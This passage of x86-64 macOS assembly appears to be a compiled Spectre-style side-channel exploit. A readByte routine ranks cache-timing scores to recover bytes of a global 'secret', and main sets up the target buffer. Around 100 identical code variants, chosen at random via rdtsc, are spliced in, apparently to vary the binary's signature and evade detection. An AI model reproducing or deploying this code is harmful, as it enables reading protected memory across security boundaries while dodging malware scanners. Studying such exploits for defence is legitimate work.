## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 12
.LreadByte_win0_var12:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 13
.LreadByte_win0_var13:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 14
.LreadByte_win0_var14:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 15
.LreadByte_win0_var15:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 16
.LreadByte_win0_var16:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 17
.LreadByte_win0_var17:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 18
.LreadByte_win0_var18:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 19
.LreadByte_win0_var19:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 20
.LreadByte_win0_var20:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 21
.LreadByte_win0_var21:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 22
.LreadByte_win0_var22:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 23
.LreadByte_win0_var23:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 24
.LreadByte_win0_var24:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 25
.LreadByte_win0_var25:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 26
.LreadByte_win0_var26:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 27
.LreadByte_win0_var27:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 28
.LreadByte_win0_var28:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 29
.LreadByte_win0_var29:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 30
.LreadByte_win0_var30:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 31
.LreadByte_win0_var31:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 32
.LreadByte_win0_var32:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 33
.LreadByte_win0_var33:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 34
.LreadByte_win0_var34:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 35
.LreadByte_win0_var35:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 36
.LreadByte_win0_var36:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 37
.LreadByte_win0_var37:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 38
.LreadByte_win0_var38:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 39
.LreadByte_win0_var39:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 40
.LreadByte_win0_var40:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 41
.LreadByte_win0_var41:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 42
.LreadByte_win0_var42:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 43
.LreadByte_win0_var43:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 44
.LreadByte_win0_var44:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 45
.LreadByte_win0_var45:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 46
.LreadByte_win0_var46:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 47
.LreadByte_win0_var47:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 48
.LreadByte_win0_var48:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 49
.LreadByte_win0_var49:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 50
.LreadByte_win0_var50:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 51
.LreadByte_win0_var51:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 52
.LreadByte_win0_var52:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 53
.LreadByte_win0_var53:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 54
.LreadByte_win0_var54:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 55
.LreadByte_win0_var55:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 56
.LreadByte_win0_var56:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 57
.LreadByte_win0_var57:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 58
.LreadByte_win0_var58:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 59
.LreadByte_win0_var59:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 60
.LreadByte_win0_var60:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 61
.LreadByte_win0_var61:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 62
.LreadByte_win0_var62:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 63
.LreadByte_win0_var63:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 64
.LreadByte_win0_var64:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 65
.LreadByte_win0_var65:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 66
.LreadByte_win0_var66:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 67
.LreadByte_win0_var67:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 68
.LreadByte_win0_var68:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 69
.LreadByte_win0_var69:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 70
.LreadByte_win0_var70:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 71
.LreadByte_win0_var71:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 72
.LreadByte_win0_var72:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 73
.LreadByte_win0_var73:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 74
.LreadByte_win0_var74:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 75
.LreadByte_win0_var75:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 76
.LreadByte_win0_var76:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 77
.LreadByte_win0_var77:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 78
.LreadByte_win0_var78:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 79
.LreadByte_win0_var79:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 80
.LreadByte_win0_var80:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 81
.LreadByte_win0_var81:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 82
.LreadByte_win0_var82:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 83
.LreadByte_win0_var83:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 84
.LreadByte_win0_var84:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 85
.LreadByte_win0_var85:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 86
.LreadByte_win0_var86:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 87
.LreadByte_win0_var87:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 88
.LreadByte_win0_var88:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 89
.LreadByte_win0_var89:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 90
.LreadByte_win0_var90:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 91
.LreadByte_win0_var91:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 92
.LreadByte_win0_var92:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 93
.LreadByte_win0_var93:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 94
.LreadByte_win0_var94:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 95
.LreadByte_win0_var95:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 96
.LreadByte_win0_var96:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 97
.LreadByte_win0_var97:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 98
.LreadByte_win0_var98:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
## Variant 99
.LreadByte_win0_var99:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB3_34
## %bb.32:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1076(%rbp), %rax
	cmpl	$2, -1040(%rbp,%rax,4)
	jmp	.LreadByte_win0_continue
.LreadByte_win0_continue:
	jne	LBB3_35
## %bb.33:                              ##   in Loop: Header=BB3_5 Depth=1
	movslq	-1080(%rbp), %rax
	cmpl	$0, -1040(%rbp,%rax,4)
	jne	LBB3_35
LBB3_34:
	jmp	LBB3_37
LBB3_35:                                ##   in Loop: Header=BB3_5 Depth=1
	jmp	LBB3_36
LBB3_36:                                ##   in Loop: Header=BB3_5 Depth=1
	movl	-1068(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -1068(%rbp)
	jmp	LBB3_5
LBB3_37:
	movl	-1088(%rbp), %eax
	xorl	-1040(%rbp), %eax
	movl	%eax, -1040(%rbp)
	movl	-1076(%rbp), %eax
	movb	%al, %cl
	movq	-1056(%rbp), %rax
	movb	%cl, (%rax)
	movslq	-1076(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	movq	-1064(%rbp), %rax
	movl	%ecx, (%rax)
	movl	-1080(%rbp), %eax
	movb	%al, %cl
	movq	-1056(%rbp), %rax
	movb	%cl, 1(%rax)
	movslq	-1080(%rbp), %rax
	movl	-1040(%rbp,%rax,4), %ecx
	movq	-1064(%rbp), %rax
	movl	%ecx, 4(%rax)
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	-8(%rbp), %rcx
	cmpq	%rcx, %rax
	jne	LBB3_39
## %bb.38:
	addq	$1120, %rsp    # # imm = 0x460
	popq	%rbp
	retq
LBB3_39:
	callq	___stack_chk_fail
	.cfi_endproc
                                        ## -- End function
	.globl	_main                           ## -- Begin function main
	.p2align	4, 0x90
_main:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$64, %rsp
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	%rax, -8(%rbp)
	movl	$0, -20(%rbp)
	movl	%edi, -24(%rbp)
	movq	%rsi, -32(%rbp)
	movl	$8, %edi
	callq	_malloc
	movq	%rax, %rcx
	movq	_target@GOTPCREL(%rip), %rax
	movq	%rcx, (%rax)
	movq	_secret(%rip), %rdi
	callq	_strlen
                                        ## kill: def $eax killed $eax killed $rax
	movl	%eax, -40(%rbp)
	movq	_secret(%rip), %rax
	movq	%rax, -48(%rbp)
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$100, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win3_var0
	cmpl	$1, %eax
	je	.Lmain_win3_var1
	cmpl	$2, %eax
	je	.Lmain_win3_var2
	cmpl	$3, %eax
	je	.Lmain_win3_var3
	cmpl	$4, %eax
	je	.Lmain_win3_var4
	cmpl	$5, %eax
	je	.Lmain_win3_var5
	cmpl	$6, %eax
	je	.Lmain_win3_var6
	cmpl	$7, %eax
	je	.Lmain_win3_var7
	cmpl	$8, %eax
	je	.Lmain_win3_var8
	cmpl	$9, %eax
	je	.Lmain_win3_var9
	cmpl	$10, %eax
	je	.Lmain_win3_var10
	cmpl	$11, %eax
	je	.Lmain_win3_var11
	cmpl	$12, %eax
	je	.Lmain_win3_var12
	cmpl	$13, %eax
	je	.Lmain_win3_var13
	cmpl	$14, %eax
	je	.Lmain_win3_var14
	cmpl	$15, %eax
	je	.Lmain_win3_var15
	cmpl	$16, %eax
	je	.Lmain_win3_var16
	cmpl	$17, %eax
	je	.Lmain_win3_var17
	cmpl	$18, %eax
	je	.Lmain_win3_var18
	cmpl	$19, %eax
	je	.Lmain_win3_var19
